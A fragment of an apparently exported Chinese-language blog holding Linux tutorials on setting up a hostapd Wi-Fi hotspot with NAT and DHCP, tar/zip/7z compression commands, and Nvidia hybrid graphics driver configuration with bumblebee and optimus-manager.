class="line">wmm_ac_vi_cwmin=3</span><br><span class="line">wmm_ac_vi_cwmax=4</span><br><span class="line">wmm_ac_vi_txop_limit=94</span><br><span class="line">wmm_ac_vi_acm=0</span><br><span class="line">wmm_ac_vo_aifs=2</span><br><span class="line">wmm_ac_vo_cwmin=2</span><br><span class="line">wmm_ac_vo_cwmax=3</span><br><span class="line">wmm_ac_vo_txop_limit=47</span><br><span class="line">wmm_ac_vo_acm=0</span><br><span class="line">eapol_key_index_workaround=0</span><br><span class="line">eap_server=0</span><br><span class="line">own_ip_addr=127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h2><p>  可使用网桥或NAT两种模式，网桥模式还得单独取得认证才能上网，而NAT模式则是认证后再将网络转发分享出来</p>
<h3 id="NAT设置"><a href="#NAT设置" class="headerlink" title="NAT设置"></a>NAT设置</h3><h4 id="启动包转发"><a href="#启动包转发" class="headerlink" title="启动包转发"></a>启动包转发</h4><p>  <strong>检查包转发配置情况</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -a |grep forward</span><br></pre></td></tr></table></figure>
<p>  信息为用于控制每个默认值，每个接口的转发的选项，以及每个接口的IPv4 / IPv6的单独选项</p>
<p>  <strong>启用临时包转发</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
<p>  要想选择性地为某一个具体的网卡提供包转发，使用<code>sysctl net.ipv4.conf.interface_name.forwarding=1</code>来代替</p>
<p>  永久开启需编辑<code>/etc/sysctl.d/30-ipforward.conf</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net.ipv4.ip_forward&#x3D;1</span><br><span class="line">net.ipv6.conf.default.forwarding&#x3D;1</span><br><span class="line">net.ipv6.conf.all.forwarding&#x3D;1</span><br></pre></td></tr></table></figure></p>
<h4 id="启用NAT"><a href="#启用NAT" class="headerlink" title="启用NAT"></a>启用NAT</h4><p>  <strong>使用<a href="https://wiki.archlinux.org/index.php/Iptables"><code>iptables</code></a>配置规则来启用NAT</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE</span><br><span class="line">sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">sudo iptables -A FORWARD -i wifi_ap -o wlan0 -j ACCEPT</span><br><span class="line"></span><br><span class="line"># 保存规则</span><br><span class="line">sudo iptables-save &gt; &#x2F;etc&#x2F;iptables&#x2F;iptables.rules</span><br></pre></td></tr></table></figure>
<p>  <strong><em>或</em></strong> <strong>使用<a href="https://wiki.archlinux.org/index.php/Nftables"><code>nftables</code></a>启用NAT</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nft add table ip nat</span><br><span class="line">sudo nft add chain ip nat prerouting &#123; type nat hook prerouting priority 0 \; &#125;</span><br><span class="line">sudo nft add chain ip nat postrouting &#123; type nat hook postrouting priority 100 \; &#125;</span><br><span class="line"></span><br><span class="line"># 永久保存</span><br><span class="line">sudo nft list ruleset &gt; &#x2F;etc&#x2F;nftables.conf</span><br></pre></td></tr></table></figure>
<h3 id="配置DHCP"><a href="#配置DHCP" class="headerlink" title="配置DHCP"></a>配置DHCP</h3><p>  配置DHCP自动分配IP,可通过使用<a href="https://wiki.archlinux.org/index.php/Dhcpd"><code>dhcpd</code></a>或<a href="https://wiki.archlinux.org/index.php/Dnsmasq"><code>dnsmasq</code></a>来启用DHCP服务</p>
<p>DHCP服务器必须允许UDP端口<code>67</code>的传入连接。对于DNS请求，还必须允许到<code>UDP / TCP</code>端口<code>53</code>的传入连接。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p udp --dport 67 -i net0 -j ACCEPT</span><br><span class="line">iptables -I INPUT -p udp --dport 53 -s 192.168.123.0&#x2F;24 -j ACCEPT</span><br><span class="line">iptables -I INPUT -p tcp --dport 53 -s 192.168.123.0&#x2F;24 -j ACCEPT</span><br><span class="line"></span><br><span class="line"># 保存规则</span><br><span class="line">sudo iptables-save &gt; &#x2F;etc&#x2F;iptables&#x2F;iptables.rules</span><br></pre></td></tr></table></figure>
<p>  <strong>使用<a href="https://wiki.archlinux.org/index.php/Dhcpd"><code>dhcpd</code></a>配置</strong></p>
<p>  <strong>给接口添加静态IP</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ip addr add 10.0.0.254/24 dev wifi_ap</span><br></pre></td></tr></table></figure></p>
<p>  <strong>配置<code>hdcpd</code>服务</strong><br>  需要安装<code>dhcpd</code>包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原有的 dhcpd.conf 中包含多个未被注释的示例，所以先将其备份再新建一个</span></span><br><span class="line">sudo mv /etc/dhcpd.conf /etc/dhcpd.conf.backup</span><br><span class="line">sudo vim /etc/dhcpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加配置内容</span></span><br><span class="line">option domain-name-servers 114.114.114.114,8.8.8.8;</span><br><span class="line">option subnet-mask 255.255.255.0;</span><br><span class="line">option routers 10.0.0.254;</span><br><span class="line">subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">  range 10.0.0.0 10.0.0.0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置MAC地址绑定固定IP</span></span><br><span class="line">option domain-name-servers 114.114.114.114,8.8.8.8;</span><br><span class="line">option subnet-mask 255.255.255.0;</span><br><span class="line">option routers 10.0.0.254;</span><br><span class="line">subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">  range 10.0.0.0 10.0.0.0;</span><br><span class="line">  host macbookpro&#123;</span><br><span class="line">  	hardware ethernet 11:22:33:aa:bb:cc;</span><br><span class="line">  	fixed-address 10.0.0.10;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  <strong>启动DHCP服务</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启用IPv4 DHCP</span><br><span class="line">sudo systemctl start dhcpd4</span><br><span class="line"></span><br><span class="line"># 启动IPv6 DHCP</span><br><span class="line">sudo systemctl start dhcpd6</span><br></pre></td></tr></table></figure></p>
<h2 id="开启热点"><a href="#开启热点" class="headerlink" title="开启热点"></a>开启热点</h2><p>  <strong>启动<code>hostapd</code>即可</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start hostapd</span><br></pre></td></tr></table></figure>
<h1 id="使用脚本"><a href="#使用脚本" class="headerlink" title="使用脚本"></a>使用脚本</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>  详解参考<a href="https://github.com/oblique/create_ap/"><code>create_ap</code></a>仓库</p>
<p>  <code>ArchLinux</code>系可直接用<code>pacman</code>安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S create_ap</span><br></pre></td></tr></table></figure>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="添加虚拟网络接口并设置地址"><a href="#添加虚拟网络接口并设置地址" class="headerlink" title="添加虚拟网络接口并设置地址"></a>添加虚拟网络接口并设置地址</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iw dev wlan0 interface add wifi_ap  <span class="built_in">type</span> managed addr 12:34:56:78:ab:<span class="built_in">cd</span></span><br></pre></td></tr></table></figure>
<h3 id="配置热点-1"><a href="#配置热点-1" class="headerlink" title="配置热点"></a>配置热点</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo create_ap -c 11 wifi_ap\ eth0 SSID passwowd</span><br></pre></td></tr></table></figure>
<p>参考：<br><a href="https://www.cnblogs.com/smileinwind/p/8535673.html">Linux连接wifi同时开启热点</a><br><a href="https://wiki.archlinux.org/index.php/Software_access_point">Software access point</a><br><a href="https://zhuanlan.zhihu.com/p/22322531">Linux 设置 wifi 共享（wifi 到 wifi）</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux文件压缩与解压</title>
    <url>/posts/b0f85331/</url>
    <content><![CDATA[<h1 id="tar详解"><a href="#tar详解" class="headerlink" title="tar详解"></a>tar详解</h1><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-c: 建立压缩档案 </span><br><span class="line">-x：解压 </span><br><span class="line">-t：查看内容 </span><br><span class="line">-r：向压缩归档文件末尾追加文件 </span><br><span class="line">-u：更新原压缩包中的文件</span><br><span class="line">-z：有gzip属性的</span><br><span class="line">-j：有bz2属性的</span><br><span class="line">-Z：有compress属性的</span><br><span class="line">-v：显示所有过程</span><br><span class="line">-O：将文件解开到标准输出</span><br><span class="line">-f: 必须参数，使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar –cvf jpg.tar *.jpg       <span class="comment"># 将目录里所有jpg文件打包成 tar.jpg </span></span><br><span class="line">tar –czf jpg.tar.gz *.jpg    <span class="comment"># 将目录里所有jpg文件打包成 jpg.tar 后，并且将其用 gzip 压缩，生成一个 gzip 压缩过的包，命名为 jpg.tar.gz </span></span><br><span class="line">tar –cjf jpg.tar.bz2 *.jpg   <span class="comment"># 将目录里所有jpg文件打包成 jpg.tar 后，并且将其用 bzip2 压缩，生成一个 bzip2 压缩过的包，命名为jpg.tar.bz2 </span></span><br><span class="line">tar –cZf jpg.tar.Z *.jpg     <span class="comment"># 将目录里所有 jpg 文件打包成 jpg.tar 后，并且将其用 compress 压缩，生成一个 umcompress 压缩过的包，命名为jpg.tar.Z </span></span><br><span class="line">rar a jpg.rar *.jpg          <span class="comment"># rar格式的压缩，需要先下载 rar for linux </span></span><br><span class="line">zip jpg.zip *.jpg            <span class="comment"># zip格式的压缩，需要先下载 zip for linux</span></span><br></pre></td></tr></table></figure>
<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar –xvf file.tar         <span class="comment"># 解压 tar 包 </span></span><br><span class="line">tar -xzvf file.tar.gz     <span class="comment"># 解压 tar.gz </span></span><br><span class="line">tar -xjvf file.tar.bz2    <span class="comment"># 解压 tar.bz2 </span></span><br><span class="line">tar –xZvf file.tar.Z      <span class="comment"># 解压 tar.Z </span></span><br><span class="line">unrar e file.rar          <span class="comment"># 解压 rar </span></span><br><span class="line">unzip file.zip            <span class="comment"># 解压 zip </span></span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>*.tar 用 tar –xvf 解压 </li>
<li>*.gz 用 gzip -d或者gunzip 解压 </li>
<li><em>.tar.gz和</em>.tgz 用 tar –xzf 解压 </li>
<li>*.bz2 用 bzip2 -d或者用bunzip2 解压 </li>
<li>*.tar.bz2用tar –xjf 解压 </li>
<li>*.Z 用 uncompress 解压 </li>
<li>*.tar.Z 用tar –xZf 解压 </li>
<li>*.rar 用 unrar e解压 </li>
<li>*.zip 用 unzip 解压</li>
</ul>
<h1 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h1><p><strong>Linux系统是不存在由后缀名确定文件类型的，有些文件在命名的时候可能没有后缀，或后缀与实际文件类型不同，导致报错的情况</strong><br>比如：&lt;&gt;使用<code>tar zxf xxx.tar.bz2</code>解压文件报错：<code>gzip: stdin: not in gzip format</code>&lt;&gt;</p>
<p><strong>在不确定文件类型时可通过<code>file</code>命令来查看文件类型，然后根据文件类型来使用</strong></p>
<h2 id="查看文件类型"><a href="#查看文件类型" class="headerlink" title="查看文件类型"></a>查看文件类型</h2><p>ile命令用来探测给定文件的类型。file命令对文件的检查分为文件系统、魔法幻数检查和语言检查3个过程。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file File_Name</span><br></pre></td></tr></table></figure>
<p><strong>选项</strong></p>
<ul>
<li><code>-b</code>：列出辨识结果时，不显示文件名称</li>
<li><code>-c</code>：详细显示指令执行过程，便于排错或分析程序执行的情形</li>
<li><code>-f&lt;名称文件&gt;</code>：指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称</li>
<li><code>-L</code>：直接显示符号连接所指向的文件类别</li>
<li><code>-m&lt;魔法数字文件&gt;</code>：指定魔法数字文件</li>
<li><code>-v</code>：显示版本信息</li>
<li><code>-z</code>：尝试去解读压缩文件的内容</li>
</ul>
<h1 id="压缩、解压命令详解"><a href="#压缩、解压命令详解" class="headerlink" title="压缩、解压命令详解"></a>压缩、解压命令详解</h1><h2 id="tar"><a href="#tar" class="headerlink" title=".tar"></a>.tar</h2><p>tar是打包格式，不是压缩格式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解包</span></span><br><span class="line">tar xvf File_Name.tar</span><br><span class="line"><span class="comment"># 打包</span></span><br><span class="line">tar cvf File_Name.tar File_Or_Dir_Name</span><br></pre></td></tr></table></figure></p>
<h2 id="gz"><a href="#gz" class="headerlink" title=".gz"></a>.gz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">gunzip File_Name.gz</span><br><span class="line">gzip -d File_Name.gz</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">gzip File_Name</span><br></pre></td></tr></table></figure>
<h2 id="tar-gz-tgz"><a href="#tar-gz-tgz" class="headerlink" title=".tar.gz/.tgz"></a>.tar.gz<code>/</code>.tgz</h2><p><code>tar</code>调用<code>gzip</code>完成压缩和解压的操作<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar zxvf File_Name.tar.gz</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">tar zcvf File_Name.tar.gz File_Or_Dir_Name</span><br></pre></td></tr></table></figure></p>
<h2 id="bz"><a href="#bz" class="headerlink" title="bz"></a>bz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">bzip2 -d File_Name.bz</span><br><span class="line">bunzip2 File_Name.bz</span><br><span class="line"><span class="comment"># 压缩 无</span></span><br></pre></td></tr></table></figure>
<h2 id="tar-gz"><a href="#tar-gz" class="headerlink" title=".tar.gz"></a>.tar.gz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar jxvf File_Name.tar.bz</span><br><span class="line"><span class="comment"># 压缩 无</span></span><br></pre></td></tr></table></figure>
<h2 id="bz2"><a href="#bz2" class="headerlink" title=".bz2"></a>.bz2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar bzip2 -d File_Name.bz2</span><br><span class="line">bunzip2 File_Name.bz2</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">bzip2 -z File_Name</span><br></pre></td></tr></table></figure>
<h2 id="tar-bz2"><a href="#tar-bz2" class="headerlink" title="tar.bz2"></a>tar.bz2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar jxvf File_Name.tar.bz2</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">tar jcvf File_Name.tar.bz2 File_Or_Dir_Name</span><br></pre></td></tr></table></figure>
<h2 id="Z"><a href="#Z" class="headerlink" title=".Z"></a>.Z</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">uncompress File_Name.Z</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">compress File_Name</span><br></pre></td></tr></table></figure>
<h2 id="tar-Z"><a href="#tar-Z" class="headerlink" title=".tar.Z"></a>.tar.Z</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar Zxvf File_Name.tar.Z</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">tar Zcvf File_Name.tar.Z File_Or_Dir_Name</span><br></pre></td></tr></table></figure>
<h2 id="zip"><a href="#zip" class="headerlink" title=".zip"></a>.zip</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">unzip File_Name.zip    <span class="comment"># 解压到当前目录</span></span><br><span class="line">unzip File_Name.zip -d Dir    <span class="comment"># 解压到指定目录</span></span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">zip File_Name.zip File_Or_Dir_Name</span><br></pre></td></tr></table></figure>
<h2 id="rar"><a href="#rar" class="headerlink" title=".rar"></a>.rar</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">rar x File_Name.rar</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">rar a File_Name.rar File_Or_Dir_Name</span><br></pre></td></tr></table></figure>
<h2 id="lha"><a href="#lha" class="headerlink" title=".lha"></a>.lha</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">lha -e File_Name.lna</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">lna -a File_Name.lha File_Name</span><br></pre></td></tr></table></figure>
<h2 id="rpm"><a href="#rpm" class="headerlink" title=".rpm"></a>.rpm</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解包</span></span><br><span class="line">rpm2cpio File_Name.rpm | cpio -div</span><br></pre></td></tr></table></figure>
<h2 id="deb"><a href="#deb" class="headerlink" title=".deb"></a>.deb</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解包</span></span><br><span class="line">ar p File_Name.deb data.tar.gz | tar zxf -</span><br></pre></td></tr></table></figure>
<h2 id="万能"><a href="#万能" class="headerlink" title="万能"></a>万能</h2><p><strong>.tar .tgz .tar.gz .tar.Z .tar.bz .tar.bz2 .zip .cpio .rpm .deb .slp .arj .rar .ace .lha .lzh .lzx .lzs .arc .sda .sfx .lnx .zoo .cab .kar .cpt .pit .sit .sea</strong></p>
<p><strong>安装sEx</strong><br><a href="http://sourceforge.net/projects/sex">下载</a>解压后将其中的可执行文件sEx拷贝到 /usr/bin目录（其他由$PATH环境变量指定的目录也可）</p>
<p><strong>sEx只是调用相关程序，本身并无压缩、解压功能,所以对相应的格式压解包时需要安装有相关压缩程序</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">sEx x File_Name.*</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">sEx a File_Name.* File_Name</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux文件压缩与解压之7z</title>
    <url>/posts/ac50e6cf/</url>
    <content><![CDATA[<p>7-Zip是具有最高压缩率的压缩软件。 支持7z（LZMA压缩算法），ZIP，CAB，ARJ，GZIP，BZIP2，TAR，CPIO，RPM和DEB格式。 新的7z格式的压缩率比ZIP格式的压缩率高30-50％。</p>
<p><strong> 不要将7z格式用于备份目的，因为它不会保存文件的所有者/组</strong> ,<a href="https://man.archlinux.org/man/7z.1">详细信息</a></p>
<h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><p><code>a</code>    添加</p>
<p><code>d</code>    删除</p>
<p><code>e</code>    解压</p>
<p><code>x</code>    带路径解压</p>
<p><code>l</code>    列表查看</p>
<p><code>t</code>    测试</p>
<p><code>u</code>    更新</p>
<h1 id="常见选项"><a href="#常见选项" class="headerlink" title="常见选项"></a>常见选项</h1><a id="more"></a>
<p><strong>选项与选项参数间无空格</strong></p>
<ul>
<li><code>-t</code> 指定压缩类型</li>
<li><code>-p</code> 设置密码</li>
<li><code>-y</code> 所有询问均回答</li>
<li><code>-o</code> 指定输出目录</li>
</ul>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p><code>7za &lt;命令&gt; [选项] &lt;压缩包名&gt; &lt;文件名&gt;</code></p>
<p>方括号 <code>[]</code> 内为可选项。书名号 <code>&lt;&gt;</code> 内的为必须项。</p>
<p><a href="https://man.archlinux.org/man/7z.1">详细产考</a></p>
<h1 id="退出代码"><a href="#退出代码" class="headerlink" title="退出代码"></a>退出代码</h1><ul>
<li><code>0</code> 正常</li>
<li><code>1</code> 警告,没有致命错误，如某文件被使用未被压缩</li>
<li><code>2</code> 致命错误</li>
<li><code>7</code> 命令行错误</li>
<li><code>8</code> 没有足够内存</li>
<li><code>255</code> 用户终止操作</li>
</ul>
<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">7z a -t7z -r xxx.7z xxx</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">7z x xxx.7z -r -o./xxx/</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux独立显卡驱动安装</title>
    <url>/posts/4a637166/</url>
    <content><![CDATA[<p>  Linux到独立显卡分开源驱动和闭源驱动两种，开源驱动不能完全发挥独立显卡到性能，闭源驱动使用<code>bumblebee</code> 的 <code>optirun</code> 的兼容性不好。而 <code>optimus-manager</code> 可以设置开机默认使用 Intel 还是 Nvidia ，可以随时在这两者之间切换。</p>
<a id="more"></a>
<h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus</span><br></pre></td></tr></table></figure>
<h1 id="安装闭源bumblebee版驱动"><a href="#安装闭源bumblebee版驱动" class="headerlink" title="安装闭源bumblebee版驱动"></a>安装闭源bumblebee版驱动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sudo mhwd -f -i pci video-hybrid-intel-nvidia-bumblebee</span><br><span class="line">sudo mhwd -f -i pci video-hybrid-intel-nvidia-430xx-bumblebee</span><br></pre></td></tr></table></figure>
<h2 id="讲用户加入到bumblee组"><a href="#讲用户加入到bumblee组" class="headerlink" title="讲用户加入到bumblee组"></a>讲用户加入到bumblee组</h2><p>sudo gpasswd -a $USER bumblebee</p>
<h2 id="设置bumblebeed开机自启"><a href="#设置bumblebeed开机自启" class="headerlink" title="设置bumblebeed开机自启"></a>设置bumblebeed开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable bumblebeed</span><br></pre></td></tr></table></figure>
<p><strong>很多硬件厂商的BIOS驱动对Linux不友好，无法顺利加载ACPI模块，从而导致无法驱动独立显卡，这就需要修改grub启动文件使ACPI模块能正常工作</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;default&#x2F;grub</span><br><span class="line"></span><br><span class="line"># 在 GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet acpi_osi&#x3D;! resume&#x3D;UUID&#x3D;2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot; 中加入 acpi_osi&#x3D;’Windows 2009’ 或者 acpi_osi&#x3D;! acpi_osi&#x3D;Linux acpi_osi&#x3D;’Windows 2015’ pcie_port_pm&#x3D;off</span><br><span class="line"># acpi_osi&#x3D;’Windows 2009’的意思是告诉ACPI模块，我是‘Windows 7’，模拟Windows让其继续运行</span><br><span class="line"></span><br><span class="line"># 如：</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet acpi_osi&#x3D;! acpi_osi&#x3D;’Windows 2009’ resume&#x3D;UUID&#x3D;2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot;</span><br></pre></td></tr></table></figure></p>
<h2 id="更新grub文件，使永久有效"><a href="#更新grub文件，使永久有效" class="headerlink" title="更新grub文件，使永久有效"></a>更新grub文件，使永久有效</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line"></span><br><span class="line">#重启</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 安装性能测试软件</span><br><span class="line">sudo pacman -S mesa-demos</span><br><span class="line">sudo pacman -S glmark2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="测试集显性能"><a href="#测试集显性能" class="headerlink" title="测试集显性能"></a>测试集显性能</h1><p>glxgears<br>glmark2</p>
<h1 id="测试独显性能"><a href="#测试独显性能" class="headerlink" title="测试独显性能"></a>测试独显性能</h1><p>optirun glxgears<br>optirun glmark2<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## NVIDIA setting面板打不开使用以下命令</span><br></pre></td></tr></table></figure><br>optirun -b none nvidia-settings -c :8<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># 使用optimus-manager管理显卡</span><br><span class="line"></span><br><span class="line">[optimus-manager仓库](https:&#x2F;&#x2F;github.com&#x2F;Askannz&#x2F;optimus-manager)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">sudo pacman -S optimus-manager</span><br></pre></td></tr></table></figure></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>确保 <code>/etc/X11/xorg.conf</code> 和 <code>/etc/X11/xorg.conf.d</code> 下没有其他显卡和显示相关的配置，如果有的话可以备份后删掉,原因是 <code>optimus-manager</code> 会生成显卡配置文件 <code>/etc/X11/xorg.conf.d/10-optimus-manager.conf</code>,多个显卡配置文件可能导致出错</p>
<p><strong>目录结构如下</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tree &#x2F;etc&#x2F;X11&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;X11&#x2F;</span><br><span class="line">├── xinit</span><br><span class="line">│   └── xinitrc.d</span><br><span class="line">│       ├── 40-libcanberra-gtk-module.sh</span><br><span class="line">│       └── 50-systemd-user.sh</span><br><span class="line">└── xorg.conf.d</span><br><span class="line">        └── 10-optimus-manager.conf</span><br></pre></td></tr></table></figure></p>
<h2 id="关闭-bumblebeed"><a href="#关闭-bumblebeed" class="headerlink" title="关闭 bumblebeed"></a>关闭 bumblebeed</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop bumblebeed</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> bumblebeed</span><br></pre></td></tr></table></figure>
<h1 id="启动optimus-manager服务"><a href="#启动optimus-manager服务" class="headerlink" title="启动optimus-manager服务"></a>启动optimus-manager服务</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable optimus-manager</span><br></pre></td></tr></table></figure>
<p><strong>重启</strong></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 切换到nvidia</span><br><span class="line">optimus-manager --switch nvidia</span><br><span class="line"></span><br><span class="line"># 切换到Intel</span><br><span class="line">optimus-manager --switch intel</span><br><span class="line"></span><br><span class="line"># 设置开机使用intel</span><br><span class="line">optimus-manager --set-startup&#x3D;intel</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">optimus-manager [参数]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数：</span></span><br><span class="line">-h，--<span class="built_in">help</span> 			显示此帮助消息并退出</span><br><span class="line">-v，--version 		打印版本并退出</span><br><span class="line">--status 			打印optimus-manager的当前状态</span><br><span class="line">--print-mode 		打印当前桌面会话正在运行的GPU模式</span><br><span class="line">--print-next-mode 	打印下次登录会话时将使用的GPU模式</span><br><span class="line">--print-startup 	打印将在启动时使用的GPU模式</span><br><span class="line">--switch MODE 		将GPU模式设置为MODE。需要注销然后登录以应用更改。可选模式：intel，nvidia，hybrid，auto（自动检测您可能想要切换到的模式）</span><br><span class="line">--set-startup STARTUP_MODE 		将启动模式设置为STARTUP_MODE。可选模式：intel，nvidia，hybrid</span><br><span class="line">--temp-config  		PATH设置临时配置文件的路径，仅用于下次重新引导。对于测试电源开关配置而不会导致无法启动的安装很有用</span><br><span class="line">--no-confirm 		切换GPU时不要求确认并跳过所有警告</span><br><span class="line">--cleanup 			删除守护程序剩余的自动生成的配置文件</span><br></pre></td></tr></table></figure>
<p>intel模式为省电模式，nvidia模式为游戏模式</p>
<h2 id="使用图形界面配置"><a href="#使用图形界面配置" class="headerlink" title="使用图形界面配置"></a>使用图形界面配置</h2><p>通过<a href="https://github.com/Shatur95/optimus-manager-qt"><code>optimus-manager-qt</code></a>或gnome-sell扩展<a href="https://github.com/inzar98/optimus-manager-argos"><code>optimus-manager-argos</code></a>来使用图形化前端来进行切换</p>
<p>图形化配置通过生成<code>/etc/share/optimus-manager.conf</code>文件并添加内容实现配置的，如果已经有该文件会直接覆盖修改</p>
